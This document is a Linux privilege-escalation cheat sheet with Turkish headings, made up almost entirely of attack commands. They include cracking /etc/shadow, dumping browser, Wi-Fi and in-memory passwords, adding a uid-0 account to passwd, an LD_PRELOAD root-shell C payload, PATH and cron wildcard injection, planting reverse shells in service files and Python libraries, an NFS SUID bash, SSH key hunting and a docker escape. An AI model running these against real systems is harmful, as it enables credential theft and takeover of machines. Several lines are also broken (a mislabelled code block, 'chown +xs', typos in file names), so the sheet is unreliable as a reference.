
# Teknikler

- **Password Mining & Dumping**
1. Password Files
2. History & Config Files
3. Browser-Dump
4. Wifi Passwords
5. Readable shadow file
6. Writable shadow file
7. Writable passwd file
8. Memory Dump (User Passwords)
9. Memory Dump (Service Passwords)

- **SUDO**
1. All & Nopasswd Permissions
2. Shell escape sequences - Binaries
3. Dynamic Linker Hijacking - LD_PRELOAD

- **SUID & SO**
1. SUID Executables
2. Dynamsic Linker Hijacking - Missing Library
3. Dynamic Linker Hijacking - Missing Library 2
4. Path Injection

- **CRON JOBS**
1. File Permissions
2. Path Injection
3. Wildcard Injection

- **CAPABILITIES**

- **SERVICES**
1. Writable .service files
2. NFS - Root squashing
3. Ssh - readable private keys

- **APPS & PACKAGES**

- **AUTO & KERNEL EXPLOITING**

---

# PASSWORD MINING & DUMPING

### Password Files

- Grep komutu ile "password" içeren metinleri bulma

```shell
grep -rnw '/' -ie 'password' --color=auto 2>/dev/null
```

- test

```shell
locate password | more
```

- Lin

```shell
./lin_enum_sh
```

- peas

```shell
./LinPEAS.sh
```

### History & Config Files

- history

```shell
cat .bash_history
```

### Browser Dump

```shell
./hack-browser-data-linux-amd64
```

### Wifi Passwords

- Wifi parolalarını görüntülemek için

```shell
cat /etc/NetworkManager/system-connections/*
```

### Readable Shadow File

```shell
ls -l /etc/shadow
cat /etc/login.defs
hashid <hash>
hashcat -m 1800 -a 0 <hash> /usr/share/wordlists/rockyou.txt
john hash -w=/usr/share/wordlists/rockyou.txt
```

### Writable Shadow File

```shell
mkpasswd -m sha-512 password
```

### Writable Passwd File

```shell
mkpasswd -m sha-512 password
test:<HASH>:0:0::/home/test:/bin/bash
```

### Memory Dump - User Passwords

```shell
./mimipenguin.sh
```

### Memory Dump - Service Passwords

```shell
./dump-memory PID
grep root *.dump
strings DUMPFILE
```

---

# SUDO

### ALL & NOPASSWD Permissions

```shell
nano /etc/sudoers

> username ALL=(ALL) NOPASSWD:ALL
```

### Shell Escape Sequences - Binaries

```shell
sudo -l
# gtfobins
```

### Dynamic Linker Hijacking - LD_PRELOAD

```shell
ldd /usr/bin/program_name
```

```python
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

```shell
gcc shell.c -o shell.so -shared -fPIC -nostartfiles -w

sudo LD_PRELOAD=shell.so program_name
```

---

# SUID & SO

### Sudo Executables

```shell
chmod u+s <file>
chmod 4755 <file>
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# GTFObins
```

### Dynamic Linker Hijacking - Missing Library

```shell
ldd program_name
readelf -d program_name
cat /etc/ld.so.conf.d/program_name.conf
ldconfig
```

### Dynamic Linker Hijacking - Missing Library 2

```shell
ldd program_name
readelf -d program_name
ldconfig
```

### Path Injection

```shell
echo "/bin/bash" > program_name
chmod 777 program_name
export PATH=/tmp:$PATH
```

---

# CRON JOBS

### File Permissions

```shell
cat /etc/crontab
reverse shell > program_name
```

### Path Injection

```shell
cat /etc/crontab
reverse shell
```

### Wildcard Injection

```shell
cat /etc/crontab
touch ./--parameter=1
```

---

# CAPABILITIES

```shell
capsh --print
cat /proc/sys/kernel/cap_last_cap
getcap program_name
getcap -r / 2>/dev/null
setcap cap_setuid+ep program_name
# GTFObins
```

---

# SERVICES

### Writable .service Files

```shell
service --status-all
systemctl list-unit-files --type=service
systemctl list-unit-files --state=failed
ls -l /etc/systemd/system /usr/lib/systemd/service | grep .service$
nano /usr/bin/service_name -> ExecStart = reverse shell
systemctl daemon-reload
systemctl start service_name
```

### NFS - Root Squashing

```shell
showmount -e IP_ADDR
mount -o rw IP_ADDR:/PATH ~/Desktop
cp /bin/bash ~/Desktop
chown root:root bash
chown +xs bash
./bash -p
```

### SSH - Readable Private Keys

```shell
ls -la /home /root /etc/ssh /home/*/.ssh
locate id_rsa
locate id_dsa
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_eys 2>/dev/null
id_rsa.pub -> authorized_keys
```

---

# APPS & PACKAGES

```shell
/usr/lib/pythonX.X/lib_name.py -> REVERSE_SHELL
python3 -c 'import sys print("\n".join(sys.path))'
/usr/lib/pythonX/dist-packages/lib_name.py -> REVERSE_SHELL
sudo PYTHONPATH=/tmp /usr/bin/pythonX.X
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

# AUTO & KERNEL EXPLOITING

```shell
./linux-exploit-suggester.sh
```